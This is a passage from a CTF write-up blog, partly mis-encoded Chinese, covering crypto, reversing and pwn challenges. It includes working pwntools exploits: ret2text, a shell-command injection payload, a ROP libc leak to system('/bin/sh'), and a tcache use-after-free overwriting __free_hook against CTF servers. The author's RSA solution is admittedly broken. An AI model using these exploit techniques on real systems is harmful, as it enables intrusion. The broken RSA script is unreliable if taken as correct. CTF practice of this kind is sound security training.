href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="warm-up"><a href="#warm-up" class="headerlink" title="warm-up"></a>warm-up</h3><p>ç›´æ¥åœ¨consoleé‡Œè°ƒç”¨jsä»£ç å³å¯å¼¹å‡ºflag</p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="WHATS-HAPPEN"><a href="#WHATS-HAPPEN" class="headerlink" title="WHATS HAPPEN?"></a>WHATS HAPPEN?</h3><p>ç®€å•çš„ç›²æ–‡ï¼Œæ‰¾ä¸ªåœ¨çº¿è§£å¯†çš„ä¸€æŠŠæ¢­å°±å¥½äº†</p><h3 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby_RSA"></a>Baby_RSA</h3><p>è™½ç„¶æ²¡æœ‰åšå‡ºæ¥ï¼Œä½†æ˜¯æ„Ÿè§‰æ€è·¯æ²¡é—®é¢˜ï¼Œå…ˆå¡«ä¸ªå‘ï¼Œä¸çŸ¥é“ä¸­é—´å“ªä¸€æ­¥é”™äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert,gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_random_prime</span>(<span class="params">bits</span>):</span></span><br><span class="line">  <span class="keyword">return</span> sympy.randprime(<span class="number">2</span>**(bits-<span class="number">1</span>), <span class="number">2</span>**bits)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen_key</span>(<span class="params">bits</span>):</span></span><br><span class="line">    p = get_random_prime(bits)</span><br><span class="line">    q = get_random_prime(bits)</span><br><span class="line">    r = get_random_prime(bits)</span><br><span class="line">    e = get_random_prime(<span class="number">48</span>)</span><br><span class="line">    <span class="keyword">assert</span> gcd(e,phi)==<span class="number">1</span></span><br><span class="line">    d=invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>)*(r-<span class="number">1</span>)//gcd(p-<span class="number">1</span>,(gcd(q-<span class="number">1</span>,r-<span class="number">1</span>))))</span><br><span class="line">    <span class="keyword">return</span> (e,d,p*q*r)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">msg,e,n</span>):</span></span><br><span class="line">    cipher=<span class="built_in">pow</span>(bytes_to_long(flag),e,n)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;nflag.enc&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="built_in">hex</span>(cipher)[<span class="number">2</span>:])</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">export_pubkey</span>(<span class="params">n,e</span>):</span></span><br><span class="line">    pubkey = RSA.construct((n,e))</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">r&#x27;npubkey.pem&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">    f.write(pubkey.export_key())</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">e,d,n=gen_key(<span class="number">256</span>)</span><br><span class="line">export_pubkey(n,e)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;d:&quot;</span>,d)</span><br><span class="line"><span class="comment">#d:6848345389131232097250291554774004483864247462767351912899751705063009304102012225840379809975695209148626539132005837425458215616241927473070938221119168859672496841054510245128799501775634965114887272776082740599056090759932017</span></span><br><span class="line">encrypt(flag,<span class="number">7</span>,n)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å…ˆç»™äº†dï¼Œè§£å‡ºæ¥pqï¼Œç„¶ååŠ å¯†çš„æ—¶å€™åˆæŠŠeæ¢æˆäº†7</p><p>ä½†æ˜¯è§£çš„æ—¶å€™è§£ä¸å‡ºæ¥ï¼Œä¸çŸ¥é“å“ªé‡Œé”™äº†ï¼Œorz</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xcd2e55e25e84bd7e050e4e28e0725f2b02442e2d55fcc8053f53811610b7a8e1d3aa2d3f3e3923d3f5ad20e00fbe532b255768d77d9e07fc23bbc6c039d741d9</span></span><br><span class="line">q = <span class="number">0xa170bce7723a072e1cfa7b466916939df85d1b97d29c73d5f3cdd8cf49f8194f</span></span><br><span class="line">e = <span class="number">7</span></span><br><span class="line">c = <span class="number">0x3773fd7f928a0231c0a26e48678984fc36db84f4d63de0cdb36a3101e6e48e140a21b6a6fae834dfaa2670d36444a5f002d28a5d4a9efb6822af43d4d98f4aa9a18139b76527049d2c4419d7ad4ddd9ef65ec7176842aa9ced2f8b14af7bf731</span></span><br><span class="line">s = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = long(gmpy2.invert(e, s))</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span> (<span class="built_in">pow</span>(c, e, d))</span><br></pre></td></tr></table></figure><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-sender"><a href="#easy-sender" class="headerlink" title="easy_sender"></a>easy_sender</h3><p>ç­¾åˆ°é¢˜ï¼Œret2text</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./easysender&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p64(<span class="number">0x080491B6</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strread"><a href="#strread" class="headerlink" title="strread"></a>strread</h3><p>æœ‰webå†…å‘³äº†ï¼Œå°è¯•ç”¨å•å¼•å·å’Œåˆ†å·é—­åˆï¼Œpayloadæ˜¯è¯•å‡ºæ¥çš„</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./white&#x27;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Path to follow:&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;]&#x27;&amp;&amp;/bin/sh;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="strlenvsread"><a href="#strlenvsread" class="headerlink" title="strlenvsread"></a>strlenvsread</h3><p><img src="https://i.loli.net/2021/05/22/ZUKae2Nf7WwczAu.png" alt=""></p><p>æ¼æ´ç‚¹åœ¨äºstrlenè¯»å–çš„é•¿åº¦å¯ä»¥è¢«00æˆªæ–­ï¼Œä½†æ˜¯readçš„è¿”å›å€¼ä¸å¯ä»¥ï¼Œæº¢å‡ºå°±å®Œäº‹äº†å—·</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./strlenvsread&#x27;</span></span><br><span class="line">port = <span class="number">10001</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;118.195.156.186&#x27;</span>,port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Neo, enter your matrix: &#x27;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">100</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Make your choice: &#x27;</span>)</span><br><span class="line">p.send(p64(<span class="number">0</span>) * <span class="number">3</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2><h3 id="MEGA-RACE"><a href="#MEGA-RACE" class="headerlink" title="MEGA-RACE"></a>MEGA-RACE</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">size_t</span> __fastcall <span class="title">scram</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> i; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="built_in">strlen</span>(flag);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0LL</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    flag[i] ^= <span class="number">0x77</span>u;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç®€å•çš„å¼‚æˆ–ï¼Œå†™ä¸ªè„šæœ¬ç®€å•è§£å¯†å³å¯</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pass[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x1B</span>, <span class="number">0x16</span>, <span class="number">0x10</span>, <span class="number">0x0C</span>, <span class="number">0x14</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x10</span>, <span class="number">0x05</span>, </span><br><span class="line">  <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x1B</span>, <span class="number">0x43</span>, <span class="number">0x03</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x19</span>, <span class="number">0x0D</span>, </span><br><span class="line">  <span class="number">0x28</span>, <span class="number">0x0E</span>, <span class="number">0x47</span>, <span class="number">0x02</span>, <span class="number">0x28</span>, <span class="number">0x16</span>, <span class="number">0x05</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x03</span>, </span><br><span class="line">  <span class="number">0x1F</span>, <span class="number">0x44</span>, <span class="number">0x28</span>, <span class="number">0x30</span>, <span class="number">0x22</span>, <span class="number">0x2E</span>, <span class="number">0x56</span>, <span class="number">0x0A</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="built_in">strlen</span>(pass);i++)</span><br><span class="line">    &#123;</span><br><span class="line">        pass[i] = pass[i] ^ <span class="number">0x77</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(pass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="easy-py"><a href="#easy-py" class="headerlink" title="easy_py"></a>easy_py</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># while None:</span></span><br><span class="line"><span class="comment">#     Happy = [</span></span><br><span class="line"><span class="comment">#         39,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         8,</span></span><br><span class="line"><span class="comment">#         109,</span></span><br><span class="line"><span class="comment">#         51,</span></span><br><span class="line"><span class="comment">#         70,</span></span><br><span class="line"><span class="comment">#         21,</span></span><br><span class="line"><span class="comment">#         65,</span></span><br><span class="line"><span class="comment">#         11,</span></span><br><span class="line"><span class="comment">#         112,</span></span><br><span class="line"><span class="comment">#         22,</span></span><br><span class="line"><span class="comment">#         111,</span></span><br><span class="line"><span class="comment">#         33,</span></span><br><span class="line"><span class="comment">#         82,</span></span><br><span class="line"><span class="comment">#         93,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         72,</span></span><br><span class="line"><span class="comment">#         77,</span></span><br><span class="line"><span class="comment">#         125,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         74,</span></span><br><span class="line"><span class="comment">#         27,</span></span><br><span class="line"><span class="comment">#         98,</span></span><br><span class="line"><span class="comment">#         23,</span></span><br><span class="line"><span class="comment">#         87,</span></span><br><span class="line"><span class="comment">#         0,</span></span><br><span class="line"><span class="comment">#         95,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         115,</span></span><br><span class="line"><span class="comment">#         117,</span></span><br><span class="line"><span class="comment">#         42,</span></span><br><span class="line"><span class="comment">#         122,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         18,</span></span><br><span class="line"><span class="comment">#         124,</span></span><br><span class="line"><span class="comment">#         103,</span></span><br><span class="line"><span class="comment">#         88]</span></span><br><span class="line"><span class="comment">#     num = 37</span></span><br><span class="line"><span class="comment">#     f = input(&#x27;Please input your flag:&#x27;)</span></span><br><span class="line"><span class="comment">#     if len(f) != 38:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Your input is illegal&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     flag = list(f)</span></span><br><span class="line"><span class="comment">#     j = 0</span></span><br><span class="line"><span class="comment">#     for i in flag:</span></span><br><span class="line"><span class="comment">#         flag[j] = ord(i)</span></span><br><span class="line"><span class="comment">#         j += 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#     t1 = threading.Thread(encode_1, (1,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t2 = threading.Thread(encode_2, (2,), **(&#x27;target&#x27;, &#x27;args&#x27;))</span></span><br><span class="line"><span class="comment">#     t1.start()</span></span><br><span class="line"><span class="comment">#     time.sleep(0.5)</span></span><br><span class="line"><span class="comment">#     t2.start()</span></span><br><span class="line"><span class="comment">#     t1.join()</span></span><br><span class="line"><span class="comment">#     t2.join()</span></span><br><span class="line"><span class="comment">#     if flag == Happy:</span></span><br><span class="line"><span class="comment">#         print(&#x27;Good job!&#x27;)</span></span><br><span class="line"><span class="comment">#         continue</span></span><br><span class="line"><span class="comment">#     print(&#x27;No no no!&#x27;)</span></span><br></pre></td></tr></table></figure><p>æ˜¯ä¸ªå¤šçº¿ç¨‹ï¼Œencodeå‡½æ•°æ˜¯ç®€å•çš„å¼‚æˆ–</p><p>ç®€å•å†™ä¸ªè§£å¯†è„šæœ¬</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode</span>():</span></span><br><span class="line">    flag = [</span><br><span class="line">        <span class="number">39</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">8</span>,</span><br><span class="line">        <span class="number">109</span>,</span><br><span class="line">        <span class="number">51</span>,</span><br><span class="line">        <span class="number">70</span>,</span><br><span class="line">        <span class="number">21</span>,</span><br><span class="line">        <span class="number">65</span>,</span><br><span class="line">        <span class="number">11</span>,</span><br><span class="line">        <span class="number">112</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">33</span>,</span><br><span class="line">        <span class="number">82</span>,</span><br><span class="line">        <span class="number">93</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">77</span>,</span><br><span class="line">        <span class="number">125</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">74</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">98</span>,</span><br><span class="line">        <span class="number">23</span>,</span><br><span class="line">        <span class="number">87</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">95</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">115</span>,</span><br><span class="line">        <span class="number">117</span>,</span><br><span class="line">        <span class="number">42</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">18</span>,</span><br><span class="line">        <span class="number">124</span>,</span><br><span class="line">        <span class="number">103</span>,</span><br><span class="line">        <span class="number">88</span>]</span><br><span class="line"></span><br><span class="line">    templist = [<span class="number">0</span>] * <span class="number">38</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">37</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">36</span>, <span class="number">0</span>, -<span class="number">2</span>):</span><br><span class="line">        templist[i] = flag[i] ^ flag[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># flag = templist</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        templist[i] = <span class="built_in">chr</span>(templist[i])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;&quot;</span>.join(templist))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œropgadgetï¼Œleak libcï¼Œubuntu18å­—èŠ‚å¯¹é½</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="xm-2019-awd-pwn2"><a href="#xm-2019-awd-pwn2" class="headerlink" title="xm_2019_awd_pwn2"></a>xm_2019_awd_pwn2</h3><ul><li>è€ƒç‚¹ï¼šuaf</li></ul><p>ç®€å•çš„uaf</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./xm_2019_awd_pwn2&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">27761</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size, name</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;idx:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">s, addr</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;\033[1;31;40m%20s--&gt;0x%x\033[0m&#x27;</span> % (s, addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;b\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line">libc_addr = u64(p.recvuntil(</span><br><span class="line">    <span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">96</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">echo(<span class="string">&quot;libc&quot;</span>, libc_addr)</span><br><span class="line">__free_hook = libc_addr + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>, p64(__free_hook) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;/bin/sh\x00\n&#x27;</span>)    <span class="comment"># 8</span></span><br><span class="line">add(<span class="number">0x10</span>, p64(libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo æ¼”ç¤º</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="å®ä¾‹æºç æ¼”ç¤º"><a href="#å®ä¾‹æºç æ¼”ç¤º" class="headerlink" title="å®ä¾‹æºç æ¼”ç¤º"></a>å®ä¾‹æºç æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> 